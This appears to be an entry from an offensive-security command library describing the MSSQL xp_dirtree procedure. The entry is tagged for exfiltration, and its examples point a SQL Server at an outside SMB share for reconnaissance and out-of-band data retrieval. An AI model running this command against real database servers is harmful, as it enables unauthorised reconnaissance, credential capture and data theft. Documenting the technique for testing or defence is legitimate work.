---
id: 136c87d6-cb6a-448f-ae3f-1becde1ed16d
name: mssql-xp-dirtree-enumerate-unc-path
type: command
executor: sql
data: exec xp_dirtree '\\$_UNC_PATH';
output: null
created_at: '2023-04-06T03:56:34.040272+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - SQL Server
tags:
  - mssql
  - exfiltration
  - unc-path
verified: true
validated: true
---

# mssql-xp-dirtree-enumerate-unc-path

## Command

```sql
exec xp_dirtree '\\$_UNC_PATH';
```

## Description

This command executes the xp_dirtree extended stored procedure in MSSQL to enumerate the directory structure of a specified UNC path, useful for verifying SMB connectivity and performing file system reconnaissance during out-of-band exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_UNC_PATH` | UNC path to enumerate (e.g., '\\10.10.15.XX\SHARE') | Yes |

## Examples

### Basic Usage

```sql
exec xp_dirtree '\\192.168.1.100\public';
```

### With Depth Limit

```sql
exec xp_dirtree '\\192.168.1.100\public', 1;
```

## Expected Output

A result set table with columns: id (subdirectory ID), name (file/directory name), parent (parent ID). For example:

| id | name | parent |
|----|------|--------|
| 1 | folder1 | 0 |
| 2 | file.txt | 1 |

Success indicates the UNC path is accessible; errors like 'Access denied' suggest permission issues.

## Related

- [[procedures/MSSQL-UNC-Path-Out-of-Band-Data-Retrieval]]
- [[commands/mssql-backup-database-to-unc-path]]
